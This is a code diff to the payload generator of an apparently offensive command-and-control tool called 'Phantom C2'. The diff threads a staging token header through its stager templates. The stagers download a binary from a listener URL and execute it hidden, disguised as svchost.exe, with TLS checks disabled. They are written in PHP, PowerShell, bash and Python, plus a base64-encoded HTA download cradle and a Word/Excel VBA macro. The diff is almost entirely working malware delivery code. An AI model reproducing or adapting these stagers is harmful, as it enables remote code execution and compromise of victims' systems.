@@ -31,6 +31,7 @@ type PayloadConfig struct {
 	CallbackPort string
 	OutputPath  string
 	Obfuscate   bool
+	StagingToken string
 }
 
 // Generate creates a stealthy payload based on the config.
@@ -136,7 +137,7 @@ $tmp = tempnam(sys_get_temp_dir(), '.update');
 $data = false;
 
 // Method 1: file_get_contents
-$ctx = stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false), 'http' => array('timeout' => 30)));
+$ctx = stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false), 'http' => array('timeout' => 30, 'header' => "X-Client-Token: {{.StagingToken}}\r\n")));
 $data = @file_get_contents($url, false, $ctx);
 
 // Method 2: curl
@@ -147,6 +148,7 @@ if (!$data || strlen($data) < 100) {
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-Client-Token: {{.StagingToken}}'));
         $data = curl_exec($ch);
         curl_close($ch);
     }
@@ -154,14 +156,14 @@ if (!$data || strlen($data) < 100) {
 
 // Method 3: exec curl/wget
 if (!$data || strlen($data) < 100) {
-    @exec("curl -sk -o $tmp '$url' 2>/dev/null");
+    @exec("curl -sk -H 'X-Client-Token: {{.StagingToken}}' -o $tmp '$url' 2>/dev/null");
     if (file_exists($tmp) && filesize($tmp) > 100) {
         chmod($tmp, 0755);
         exec("nohup $tmp > /dev/null 2>&1 &");
         echo "[+] Agent deployed via curl\n";
         exit;
     }
-    @exec("wget --no-check-certificate -q -O $tmp '$url' 2>/dev/null");
+    @exec("wget --no-check-certificate -q --header='X-Client-Token: {{.StagingToken}}' -O $tmp '$url' 2>/dev/null");
     if (file_exists($tmp) && filesize($tmp) > 100) {
         chmod($tmp, 0755);
         exec("nohup $tmp > /dev/null 2>&1 &");
@@ -233,6 +235,7 @@ function Check-WindowsUpdate {
     $u = '{{.ListenerURL}}/api/v1/update'
     $w = New-Object System.Net.WebClient
     $w.Headers.Add('User-Agent', 'Microsoft-WNS/10.0')
+    $w.Headers.Add('X-Client-Token', '{{.StagingToken}}')
     $p = [System.IO.Path]::GetTempPath() + 'svchost.exe'
     try {
         $w.DownloadFile($u, $p)
@@ -261,9 +264,9 @@ check_update() {
     local tmp=$(mktemp /tmp/.update.XXXXXX)
 
     if command -v curl &>/dev/null; then
-        curl -sk -o "$tmp" "$url" 2>/dev/null
+        curl -sk -H 'X-Client-Token: {{.StagingToken}}' -o "$tmp" "$url" 2>/dev/null
     elif command -v wget &>/dev/null; then
-        wget -q --no-check-certificate -O "$tmp" "$url" 2>/dev/null
+        wget -q --no-check-certificate --header='X-Client-Token: {{.StagingToken}}' -O "$tmp" "$url" 2>/dev/null
     fi
 
     if [ -s "$tmp" ]; then
@@ -288,7 +291,7 @@ def check_update():
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        req = urllib.request.Request(url, headers={'User-Agent': 'Python-urllib/3.10'})
+        req = urllib.request.Request(url, headers={'User-Agent': 'Python-urllib/3.10', 'X-Client-Token': '{{.StagingToken}}'})
         resp = urllib.request.urlopen(req, context=ctx)
         data = resp.read()
         if data:
@@ -307,7 +310,7 @@ check_update()`
 
 func generateHTA(cfg PayloadConfig) (string, error) {
 	// Base64 encode a PowerShell download cradle
-	psCradle := fmt.Sprintf(`$w=New-Object System.Net.WebClient;$w.Headers.Add('User-Agent','Microsoft-WNS/10.0');$p=$env:TEMP+'\svchost.exe';$w.DownloadFile('%s/api/v1/update',$p);Start-Process $p -WindowStyle Hidden`, cfg.ListenerURL)
+	psCradle := fmt.Sprintf(`$w=New-Object System.Net.WebClient;$w.Headers.Add('User-Agent','Microsoft-WNS/10.0');$w.Headers.Add('X-Client-Token','%s');$p=$env:TEMP+'\svchost.exe';$w.DownloadFile('%s/api/v1/update',$p);Start-Process $p -WindowStyle Hidden`, cfg.StagingToken, cfg.ListenerURL)
 	b64 := base64.StdEncoding.EncodeToString([]byte(psCradle))
 
 	tmpl := fmt.Sprintf(`<html>
@@ -336,7 +339,7 @@ End Sub
 }
 
 func generateVBA(cfg PayloadConfig) (string, error) {
-	psCradle := fmt.Sprintf(`powershell -ep bypass -w hidden -c "$w=New-Object System.Net.WebClient;$p=$env:TEMP+'\\svchost.exe';$w.DownloadFile('%s/api/v1/update',$p);Start-Process $p -WindowStyle Hidden"`, cfg.ListenerURL)
+	psCradle := fmt.Sprintf(`powershell -ep bypass -w hidden -c "$w=New-Object System.Net.WebClient;$w.Headers.Add('X-Client-Token','%s');$p=$env:TEMP+'\\svchost.exe';$w.DownloadFile('%s/api/v1/update',$p);Start-Process $p -WindowStyle Hidden"`, cfg.StagingToken, cfg.ListenerURL)
 
 	tmpl := fmt.Sprintf(`' Phantom C2 — VBA Macro Stager
 ' Insert into Word/Excel macro
@@ -360,6 +363,7 @@ type templateData struct {
 	CallbackIP   string
 	CallbackPort string
 	Token        string
+	StagingToken string
 }
 
 func renderTemplate(tmpl string, cfg PayloadConfig) (string, error) {
@@ -371,6 +375,7 @@ func renderTemplate(tmpl string, cfg PayloadConfig) (string, error) {
 		CallbackIP:   cfg.CallbackIP,
 		CallbackPort: cfg.CallbackPort,
 		Token:        token,
+		StagingToken: cfg.StagingToken,
 	}
 
 	t, err := template.New("payload").Parse(tmpl)
